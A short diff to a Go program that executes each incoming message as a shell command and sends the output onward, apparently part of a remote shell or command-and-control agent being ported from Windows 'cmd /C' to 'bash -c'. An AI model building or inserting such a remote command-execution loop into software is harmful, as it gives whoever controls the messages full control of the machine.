@@ -89,7 +89,7 @@ func main() {
 		} else if message == "help" {
 
 		} else {
-			cmd := exec.Command("cmd", "/C", message)
+			cmd := exec.Command("bash", "-c", message)
 			output, err := cmd.CombinedOutput()
 			if err != nil {
 				outbound(err.Error())
